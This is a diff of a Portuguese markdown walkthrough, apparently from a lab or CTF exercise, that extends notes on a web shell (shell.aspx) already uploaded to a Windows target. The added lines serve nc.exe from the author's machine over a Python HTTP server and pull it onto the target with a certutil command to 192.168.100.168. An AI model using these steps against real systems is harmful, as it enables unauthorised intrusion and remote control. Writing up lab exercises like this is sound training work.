@@ -18,4 +18,15 @@
 ## acessando o arquivo 
 ![image](https://github.com/user-attachments/assets/634bf72b-4d67-446c-8acc-9bc82da34bbb)
 ## shell.aspx subiu porem voce ainda nao tem cotrole total para navegar nos diretorios para fazer um enumeração de arquivos
+## proximo passo é baixar o nc.exe e colocar em uma pasta no seu propio windons instalar o python criar uma pasta colocar o arquivo nc.exe lá dentro e dai iniciar o servidor python com o nc.exe disponivel para dowload
+![image](https://github.com/user-attachments/assets/0b399e9c-440c-48b4-b4c5-8434dad98986)
+## coloquei em uma pasta com o nome "Nova Pasta" e inciei o servidor pyhton pelo cmd do meu windons
+![image](https://github.com/user-attachments/assets/919c4e88-32e4-4459-adcb-700e80e462e0)
+## agora para baixar usando o shell que eu subi vai ser usado o comando:
+```txt
+  certutil -urlcache -split -f http://192.168.100.168/nc.exe c:\users\public\nc.exe
 
+    o Certutil serve para baixar arquivos em um windons e como esta em um server http só vai ser preciso colocar a url,
+    com o endereço de ip do meu computador windons e o arquivo que vai ser baixado que é o nc.exe,
+    e dai ele vai salvar no users public que qualqr um tem acesso com o nome de nc.exe
+```
